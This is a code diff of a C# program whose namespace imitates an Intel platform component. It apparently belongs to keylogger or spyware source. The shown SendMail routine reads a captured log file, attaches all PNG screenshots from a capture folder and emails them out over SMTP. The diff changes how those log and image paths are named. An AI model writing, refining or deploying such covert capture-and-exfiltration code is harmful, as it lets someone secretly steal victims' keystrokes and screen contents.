@@ -11,7 +11,6 @@ namespace Intel_R__Dynamic_Platform
     partial class Program
     {
         #region Mail
-        static int mailTime = 5000;
         public static void SendMail()
         {
             try
@@ -27,7 +26,7 @@ namespace Intel_R__Dynamic_Platform
 
 
 
-                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+                string logFile = logName + logExtendtion;
 
                 if (File.Exists(logFile))
                 {
@@ -38,7 +37,7 @@ namespace Intel_R__Dynamic_Platform
                     sr.Close();
                 }
 
-                string directoryImage =Capture.imagePath + DateTime.Now.ToLongDateString();
+                string directoryImage = Capture.imagePath;
                 DirectoryInfo image = new DirectoryInfo(directoryImage);
 
                 foreach (FileInfo item in image.GetFiles("*.png"))
@@ -54,7 +53,7 @@ namespace Intel_R__Dynamic_Platform
                 SmtpServer.Send(mail);
                 //Console.WriteLine("Send mail!");
 
-               
+
                 // https://www.google.com/settings/u/1/security/lesssecureapps
             }
             catch (Exception ex)
